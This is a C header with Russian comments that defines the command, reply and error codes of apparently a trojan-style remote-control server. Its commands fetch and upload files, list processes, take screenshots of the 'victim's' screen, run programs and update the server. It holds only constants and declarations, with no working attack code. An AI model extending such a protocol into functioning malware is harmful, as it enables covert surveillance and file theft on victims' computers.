#pragma once

// Определения кодов команд сервера
#define  SC_AUTHORIZE        1000  // Авторизация
#define  SC_GET_FILE         1001  // Получение файла
#define  SC_SHUTDOWN_SERVER  1002  // Останов сервера
#define  SC_CONTINUE         1003  // Команда серверу продолжить операцию (пока только для пересылки файлов)
#define  SC_GETVERSION       1004  // Получение версии сервера (ответ - заголовок + 4 байта - номер версии)
#define  SC_UPDATE_SERVER    1005  // Обновление сервера до новой версии
#define  SC_GET_FILE_LIST    1006  // Получение списка файлов в данном каталоге
#define  SC_GET_DRIVES_LIST  1007  // Получение списка логических дисков
#define  SC_SHOW_MESSAGE     1008  // Показывает сообщение на экране
#define  SC_GET_PROCESS_LIST 1009  // Получение списка запущенных процессов
#define  SC_OPEN_CD_DOOR     1010  // Открыть дверцу CD-ROM'a
#define  SC_GET_SCREENSHOT   1011  // Получить изображение с экрана жертвы
#define  SC_UPLOAD_FILE      1012  // Загрузка файла на сервер
#define  SC_CREATE_PROCESS   1013  // Запуск программы на выполнение
#define  SC_SHELL_EXECUTE    1014  // Запуск какого-либо файла, например, картинки или MP3
#define  SC_MAX_WINAMP_VOL   1015  // Сделать звук в Winamp'e максимальным
#define  SC_GET_FILES_TREE   1016  // Получение дерева каталогов и файлов (с формированием его на сервере)
#define  SC_GET_FILES_LIST   1017  // Загрузка файлов списком
#define  SC_GET_FREE_SPACE   1018  // Получение количества свободного места
#define  SC_DIRECT_UPLOAD    1019  // Прямая загрузка файлов с открытой шары или с другого места на сервере - средствами сервера
#define  SC_DELETE_FILE      1020  // Удаление файла с сервера
#define  SC_GET_FILE_EX      1021  // Получение файла с докачкой

// Нужны команды:
// - удаление файлов (желательно удаление списком)
// - получение списка процессов
// - выключение монитора
// - перезагрузка компьютера
// - получение изображения на экране
// - 

// Определения кодов ответов клиенту
#define  CC_ERROR             2000  // Ошибка выполнения команды - за ней сразу идет код ошибки, а потом, возможно, и тект ошибки
#define  CC_CONFIRM           2001  // Подтверждение успешного выполнения команды

/////////////////////////////////////////////////////////////////////////////////////
// Коды ошибок выполнения команд
/////////////////////////////////////////////////////////////////////////////////////
#define  ERR_WRONG_LOGIN_OF_PWD 3000  // Ошибочный логин или пароль
#define  ERR_SERVER_IS_DOWN     3001  // Сервер умер
#define  ERR_WRONG_LOGIN_DATA   3002  // Ошибочные данные для логина
#define  ERR_NOT_AUTHORIZED     3003  // Неавторизованному пользователю операция недоступна
#define  ERR_FILE_NOT_FOUND     3004  // Файл не найден
#define  ERR_WRITING_FILE       3005  // Ошибка записи файла
#define  ERR_BLOCK_SIZE_TOOBIG  3006  // Размер блока данных слишком большой
#define  ERR_BLOCK_SIZE         3007  // Ошибочный размер полученных данных
#define  ERR_RECEIVED_FILE_SIZE 3008  // Неправильный размер принятого файла
#define  ERR_UNKNOWN_COMMAND    3009  // Неизвестная команда серверу
#define  ERR_ZERO_PATH_LEN      3010  // Нулевая длина пути
#define  ERR_SEARCHING_FILES    3011  // Ошибка при поиске файлов
#define  ERR_OUT_OF_MEMORY      3012  // Не хватило памяти
#define  ERR_STRING_IS_TOO_LONG 3013  // Слишком длинная строка сообщения
#define  ERR_GET_PROCESS_LIST   3014  // Ошибка получения списка процессов
#define  ERR_MAKING_SCREENSHOT  3015  // Ошибка получения содержимого экрана жертвы
#define  ERR_STARTING_PROCESS   3016  // Ошибка создания процесса
#define  ERR_WINAMP_NOT_FOUND   3017  // Не найдено окно Winamp'a
#define  ERR_WRONG_SCR_FORMAT   3018  // Запрошен ошибочный формат картинки
#define  ERR_WRONG_JPEG_QUALITY 3019  // Запрошено ошибочное качество сжатия (д. б. от 0 до 100)
#define  ERR_CONVERTING_TO_JPEG 3020  // Ошибка конвертирования изображения в JPEG
#define  ERR_OPENING_FILE       3021  // Ошибка открытия файла
#define  ERR_CREATING_PROCESS   3022  // Ошибка создания процесса
#define  ERR_FPATH_PARAM_NULL   3023  // Нулевой параметр fpath в функции отсылки файла
#define  ERR_SHELL_EXECUTE      3024  // Ошибка выполнения функции ShellExecute
#define  ERR_GETDISTFREESPACE   3025  // Ошибка выполнения функции GetDiskFreeSpace
#define  ERR_COPYING_FILE       3026  // Ошибка копирования файла
#define  ERR_DELETING_FILE      3027  // Ошибка удаления файла

// Структура-описатель ошибки
struct SErrorDescriptor
{
   int code;   // Код ошибки
   char *text; // Текст ошибки
};

extern const SErrorDescriptor g_errors[];
extern const char *err_getting_data;
const char *GetErrorText(int code);
